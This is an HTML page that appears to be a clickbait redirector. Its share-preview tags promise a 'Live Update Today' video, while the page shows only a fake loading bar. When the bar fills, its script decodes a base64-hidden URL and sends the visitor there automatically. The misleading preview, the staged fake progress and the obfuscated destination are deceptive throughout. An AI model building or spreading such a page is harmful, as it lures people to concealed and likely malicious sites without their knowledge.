<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loading...</title>

<meta property="og:title" content="🔴 Live Update Today">
<meta property="og:description" content="Watch the latest update happening right now ▶️ Click to view.">
<meta property="og:image" content="https://i.imgur.com/7fT7ulx.jpeg">
<meta property="og:type" content="website">

<style>
body {
  margin:0;
  background:#0f0f0f;
  color:white;
  font-family:Arial;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  flex-direction:column;
}

.loader {
  width:50px;
  height:50px;
  border:5px solid #333;
  border-top:5px solid #00ffcc;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin-bottom:25px;
}

@keyframes spin {
  0%{transform:rotate(0)}
  100%{transform:rotate(360deg)}
}

.progress-bar {
  width:220px;
  height:6px;
  background:#222;
  border-radius:10px;
  overflow:hidden;
}

.progress {
  height:100%;
  width:0%;
  background:#00ffcc;
}
</style>
</head>

<body>

<div class="loader"></div>
<h2 id="status">Preparing...</h2>

<div class="progress-bar">
  <div class="progress" id="progress"></div>
</div>

<script>
let p = 0;
let bar = document.getElementById("progress");
let txt = document.getElementById("status");

// 🔒 encoded URL (base64)
let encoded = "aHR0cHM6Ly9mZGVkZGcueGh1YnNzLm9uZS9wL25oVk55"; 

function decode(u){
  return atob(u);
}

let i = setInterval(()=>{
  p += Math.random()*12;
  if(p>100) p=100;

  bar.style.width = p+"%";

  if(p<30){
    txt.innerText="Preparing...";
  } else if(p<60){
    txt.innerText="Connecting...";
  } else if(p<90){
    txt.innerText="Almost ready...";
  } else {
    txt.innerText="Launching...";
  }

  if(p>=100){
    clearInterval(i);

    // redirect hasil decode
    window.location.href = decode(encoded);
  }

}, 300);
</script>

</body>
</html>
